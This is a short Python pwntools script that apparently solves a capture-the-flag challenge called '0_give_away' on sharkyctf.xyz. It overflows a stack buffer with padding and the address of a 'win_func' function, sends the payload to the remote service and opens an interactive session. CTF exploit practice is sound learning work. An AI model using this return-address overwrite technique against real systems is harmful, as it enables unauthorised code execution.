from pwn import *

e = ELF("./0_give_away")
p = remote("sharkyctf.xyz", 20333)

win_addr = e.symbols['win_func']
print(win_addr)

code = "A" * 0x20
code += "A" * 8  # SFP
code += p64(win_addr)

p.sendline(code)
p.interactive()
